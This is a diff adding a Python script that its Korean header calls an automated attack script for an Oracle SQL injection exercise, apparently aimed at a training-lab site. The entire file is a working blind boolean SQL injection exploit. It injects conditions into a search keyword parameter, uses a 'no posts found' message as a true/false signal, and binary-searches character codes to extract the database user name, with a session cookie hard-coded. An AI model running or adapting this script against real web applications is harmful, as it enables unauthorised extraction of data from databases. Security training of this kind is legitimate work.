@@ -1,0 +1,80 @@
+==============================
+
+* SQL Injection Oracle 4번 
+
+  자동화 공격 스크립트
+
+==============================
+import requests
+
+base_url = "https://lab.eqst.co.kr:8442/exam4/free"
+headers = {
+    "Cookie": "JSESSIONID=1E5255D15664CAB32A5A8ACB46955988"
+}
+params = {
+    "page": "1",
+    "sorting": "",
+    "sortingAd": "",
+    "startDt": "",
+    "endDt": "",
+    "searchType": "all",
+    "keyword": ""
+}
+
+
+def find_user_length(max_len=50):
+    """USER명 길이 추출"""
+    for i in range(1, max_len + 1):
+        query = f"usagi cute%' and (select length(user) from dual)={i} and 'j%'='j"
+        params["keyword"] = query
+        response = requests.get(base_url, params=params, headers=headers)
+
+        if '등록된 게시물이 없습니다' not in response.text:
+            print(f"USER명 길이: {i}")
+            return i
+    return None
+
+
+def find_char_at_pos(pos, ascii_min=30, ascii_max=126):
+    """특정 위치(pos)의 글자를 이분 탐색으로 찾기"""
+    low, high = ascii_min, ascii_max
+    while low <= high:
+        mid = (low + high) // 2
+
+        # mid보다 크거나 같은지 확인
+        query = f"usagi cute%' and (select ascii(substr(user, {pos}, 1)) from dual) >= {mid} and 'j%'='j"
+        params["keyword"] = query
+        response = requests.get(base_url, params=params, headers=headers)
+
+        if '등록된 게시물이 없습니다' not in response.text:
+            # 글자가 mid 이상 → 더 큰 쪽에서 탐색
+            low = mid + 1
+        else:
+            # 글자가 mid 미만 → 더 작은 쪽에서 탐색
+            high = mid - 1
+
+    # high가 최종적으로 맞는 값
+    print(f"USER {pos}번째 글자: {chr(high)} (ascii={high})")
+    return chr(high)
+
+
+def extract_username():
+    """USER명 전체 추출"""
+    user_len = find_user_length()
+    if not user_len:
+        raise RuntimeError("USER명 길이를 찾을 수 없습니다.")
+
+    buffer = []
+    for pos in range(1, user_len + 1):
+        ch = find_char_at_pos(pos)
+        buffer.append(ch)
+
+    username = "".join(buffer)
+    print("최종 USER명:", username)
+    return username
+
+
+if __name__ == "__main__":
+    extract_username()
+
+==============================
